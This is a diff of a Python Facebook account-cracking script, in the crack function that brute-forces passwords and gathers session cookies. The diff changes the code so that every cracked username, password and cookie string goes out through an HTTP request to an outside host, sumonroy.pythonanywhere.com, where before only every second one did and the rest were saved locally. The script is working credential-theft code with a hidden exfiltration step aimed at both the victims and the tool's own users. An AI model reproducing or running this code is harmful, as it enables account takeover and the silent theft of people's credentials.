@@ -226,16 +226,9 @@ def crack(uid, password_list, total_count):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                         statusok = (f"{user}|{pw}|{kuki}")
-                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:    
-                         print('\033[1;92m OK '+user+'|'+pw+'')
-                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                         oks.append(user)
-                         continue
+                    statusok = (f"{user}|{pw}|{kuki}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    continue
             elif 'checkpoint' in log_cookies:
                     bkas.append(uid)
                     if len(bkas)% 2 == 0:
@@ -249,7 +242,7 @@ def crack(uid, password_list, total_count):
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
-                
+        loop += 1
     except requests.exceptions.Timeout:
         #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
